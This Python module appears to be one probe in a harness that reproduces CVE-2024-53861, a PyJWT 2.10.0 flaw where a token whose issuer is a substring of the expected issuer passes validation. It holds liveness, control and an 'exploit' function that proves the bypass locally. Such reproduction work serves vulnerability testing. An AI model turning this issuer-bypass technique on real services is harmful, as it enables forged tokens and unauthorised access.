"""CVE-2024-53861 -- PyJWT accepts a substring as the issuer (2.10.0 -> 2.10.1).

2.10.0 tested the ``iss`` claim for containment rather than equality, so a token
whose issuer is any substring of the expected issuer passed validation.

Oracle, declared before execution: ``jwt.decode(..., issuer=...)`` returns
instead of raising ``InvalidIssuerError`` for a token whose ``iss`` is a strict
substring of the expected issuer.
"""

from __future__ import annotations

import os

from ._support import pinned_version

DIST = "pyjwt"
MODULE = "jwt"

_SECRET = "a-shared-secret-for-this-probe"
_EXPECTED_ISSUER = "https://issuer.example/realm"
#: A strict substring of the expected issuer, and not a plausible issuer itself.
_HOSTILE_ISS = "issuer.example"


def _decode(iss: str) -> dict:
    import jwt

    token = jwt.encode({"iss": iss, "sub": "alice"}, _SECRET, algorithm="HS256")
    return jwt.decode(token, _SECRET, algorithms=["HS256"], issuer=_EXPECTED_ISSUER)


def liveness(ctx: dict) -> tuple[bool, str]:
    """The correct issuer must validate, and the pin must be the pin."""
    origin = pinned_version(DIST, MODULE, ctx["version"], ctx["pin_dir"])
    claims = _decode(_EXPECTED_ISSUER)
    ok = claims.get("sub") == "alice"
    return ok, f"correct issuer validated -> {claims} from {os.path.basename(origin)}"


def control(ctx: dict) -> tuple[bool, str]:
    """An unrelated issuer must be REFUSED on both pins, or the check is inert."""
    try:
        claims = _decode("https://unrelated.example/other")
    except Exception as exc:
        return False, f"unrelated issuer refused: {type(exc).__name__}: {exc}"
    return True, f"unrelated issuer was accepted: {claims}"


def exploit(ctx: dict) -> tuple[bool, str]:
    try:
        claims = _decode(_HOSTILE_ISS)
    except Exception as exc:
        return False, f"substring issuer refused: {type(exc).__name__}: {exc}"
    return True, f"substring issuer {_HOSTILE_ISS!r} accepted for {_EXPECTED_ISSUER!r}: {claims}"
